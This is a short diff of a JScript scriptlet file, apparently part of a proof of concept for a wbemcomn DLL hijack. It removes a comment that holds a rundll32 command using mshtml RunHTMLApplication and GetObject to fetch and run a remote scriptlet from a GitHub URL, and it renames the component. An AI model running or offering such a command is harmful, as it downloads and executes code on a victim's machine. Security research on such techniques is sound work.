@@ -1,9 +1,6 @@
-<!-- Command -->
-<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/greycel/pocs/master/wbemcomn01") -->
-
 <?xml version="1.0"?>
 <package>
-<component id="testCalc">
+<component id="Test Wbemcomn DLL Hijack">
 
 <script language="JScript">
 <![CDATA[
